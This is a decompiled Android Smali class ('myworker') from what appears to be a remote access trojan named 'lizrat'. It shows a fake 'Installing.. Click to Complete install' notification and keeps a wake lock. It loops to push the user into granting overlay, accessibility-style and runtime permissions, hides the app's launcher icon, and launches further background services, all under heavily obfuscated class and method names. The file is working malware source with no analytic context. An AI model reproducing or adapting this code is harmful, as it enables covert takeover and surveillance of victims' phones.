.class public LLiz0rd/lizrat/myworker;
.super Landroid/app/IntentService;
.source "myworker.java"


# instance fields
.field wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    .line 27
    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    .line 29
    iput-object v0, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method

.method public static cancelnotification(Landroid/content/Context;I)V
    .locals 1

    const-string v0, "notification"

    .line 50
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/NotificationManager;

    .line 51
    invoke-virtual {p0, p1}, Landroid/app/NotificationManager;->cancel(I)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    .line 45
    invoke-super {p0, p1}, Landroid/app/IntentService;->onBind(Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object p1

    return-object p1
.end method

.method public onDestroy()V
    .locals 2

    .line 32
    invoke-super {p0}, Landroid/app/IntentService;->onDestroy()V

    .line 33
    iget-object v0, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 35
    iget-object v0, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 37
    iget-object v0, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 8

    const-string p1, "MyInstall"

    .line 57
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    const/4 v2, 0x0

    if-lt v0, v1, :cond_0

    .line 58
    const-class v0, Landroid/app/NotificationManager;

    invoke-virtual {p0, v0}, LLiz0rd/lizrat/myworker;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    if-eqz v0, :cond_0

    .line 60
    invoke-virtual {v0, p1}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v3

    if-nez v3, :cond_0

    .line 61
    new-instance v3, Landroid/app/NotificationChannel;

    const-string v4, "Install"

    const/4 v5, 0x4

    invoke-direct {v3, p1, v4, v5}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v4, "Installation"

    .line 62
    invoke-virtual {v3, v4}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 63
    invoke-virtual {v3, v2}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v4, 0x0

    .line 64
    invoke-virtual {v3, v4, v4}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 66
    invoke-virtual {v0, v3}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 67
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0, p1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string p1, "Installing.."

    .line 68
    invoke-virtual {v0, p1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p1

    const-string v0, "Click to Complete install"

    .line 69
    invoke-virtual {p1, v0}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object p1

    const v0, 0x106000d

    .line 70
    invoke-virtual {p1, v0}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object p1

    .line 71
    invoke-virtual {p1, v2}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object p1

    .line 72
    invoke-virtual {p1}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object p1

    const/16 v0, 0x60b

    .line 73
    invoke-virtual {p0, v0, p1}, LLiz0rd/lizrat/myworker;->startForeground(ILandroid/app/Notification;)V

    :cond_0
    const-string p1, "power"

    .line 77
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/PowerManager;

    .line 78
    iget-object v0, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v3, 0x1

    if-nez v0, :cond_1

    const-string v0, "Android:Watchlock"

    .line 80
    invoke-virtual {p1, v3, v0}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    iput-object p1, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 82
    :cond_1
    iget-object p1, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz p1, :cond_2

    .line 84
    iget-object p1, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result p1

    if-nez p1, :cond_2

    .line 86
    iget-object p1, p0, LLiz0rd/lizrat/myworker;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_5

    .line 95
    :catch_0
    :cond_2
    :goto_0
    :try_start_1
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    sget v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I

    int-to-long v4, v0

    invoke-virtual {p1, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 101
    :catch_1
    :try_start_2
    const-class p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;

    invoke-static {p0, p1}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->IA_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_E(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    const/16 v0, 0xdac

    const/high16 v4, 0x40000000    # 2.0f

    const/high16 v5, 0x20000000

    const/high16 v6, 0x10000000

    if-nez p1, :cond_3

    .line 102
    invoke-static {}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->NeedSuper()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 104
    invoke-static {p0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->GS_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_B(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_2

    .line 106
    sget p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->Trys:I

    add-int/2addr p1, v3

    sput p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->Trys:I

    .line 110
    sget p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->Trys:I

    const/4 v7, 0x5

    if-lt p1, v7, :cond_2

    .line 112
    sput v2, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->Trys:I

    .line 114
    sput v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I

    .line 116
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 117
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 118
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 119
    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 116
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 132
    :cond_3
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt p1, v7, :cond_4

    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_4

    invoke-static {}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->NeedSuper()Z

    move-result p1

    if-nez p1, :cond_4

    .line 134
    sget-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->shown:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_2

    const/16 p1, 0x1388

    .line 136
    sput p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I

    .line 137
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->shown:Ljava/lang/Boolean;

    .line 138
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/refermwatershedqhelicopterrargumentslhellfownerksurveysespeechzfreighttfireplaceyiraqiqoccurreda18;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 139
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 138
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 147
    :cond_4
    invoke-static {}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->PERMISSIONS()[Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->H__membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_P(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_6

    .line 148
    sget-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->asked:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_5

    .line 150
    sput v0, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I

    .line 151
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->asked:Ljava/lang/Boolean;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 155
    :try_start_3
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/fpkintensivefnearestxvirginiaoliableehostedtfathersyspeaklprisoneroinvestigatefcontainereelephante24;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 156
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 157
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 158
    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 155
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->startActivity(Landroid/content/Intent;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_0

    .line 162
    :catch_2
    :try_start_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->asked:Ljava/lang/Boolean;

    goto/16 :goto_0

    :cond_5
    const/16 p1, 0x7d0

    .line 165
    sput p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I

    goto/16 :goto_0

    .line 172
    :cond_6
    sget-boolean p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->Is_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Hidden:Z

    if-nez p1, :cond_7

    .line 174
    sput-boolean v3, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->Is_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Hidden:Z

    .line 175
    invoke-virtual {p0}, LLiz0rd/lizrat/myworker;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string v0, "I#C#O#N#S#C#A#N#E#R"

    invoke-static {p1, v0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->SwapMe(Landroid/content/Context;Ljava/lang/String;)V

    .line 179
    :cond_7
    sget-boolean p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->iamworking:Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    if-nez p1, :cond_a

    .line 182
    :try_start_5
    sput-boolean v3, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->allok:Z

    .line 183
    sput-boolean v3, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->iamworking:Z

    .line 184
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32bypass:Ljava/lang/Boolean;

    .line 185
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32FOR_prim:Ljava/lang/Boolean;

    .line 186
    sput-boolean v3, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32CheckPrims:Z

    .line 191
    const-class p1, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;

    invoke-static {p1, p0}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew30;->fitltrialrfairlyglesskkennethqspecificationstenterpriseswcigarettesrmatewtonyldimelinkingz49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_8

    .line 192
    invoke-virtual {p0}, LLiz0rd/lizrat/myworker;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const v0, 0x7f070002

    invoke-virtual {p1, v0}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->p_aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5_r:Ljava/lang/String;

    .line 194
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/vegetablenemissionswobjemonroeamarkedvtitlegcrawfordbexportsosubmissionsarefinancekpcsxasciix33;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 198
    :cond_8
    invoke-static {p0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->is_dozemode(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_9

    .line 199
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/straightbgettingcpurpleigoogleklonemlowestbordinarygamateurjalbaniafcapertrainedxbreedwrgh17;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 200
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 201
    invoke-virtual {p1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 202
    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 203
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/myworker;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 208
    :catch_3
    :cond_9
    :try_start_6
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p1, v1, :cond_a

    const/16 p1, 0x1a14

    .line 209
    invoke-static {p0, p1}, LLiz0rd/lizrat/myworker;->cancelnotification(Landroid/content/Context;I)V

    .line 210
    invoke-virtual {p0, v3}, LLiz0rd/lizrat/myworker;->stopForeground(Z)V

    .line 211
    invoke-virtual {p0}, LLiz0rd/lizrat/myworker;->stopSelf()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    :cond_a
    const/16 p1, 0x61a8

    .line 217
    :try_start_7
    sput p1, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->speedTime:I
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    goto/16 :goto_0

    :catch_5
    return-void
.end method
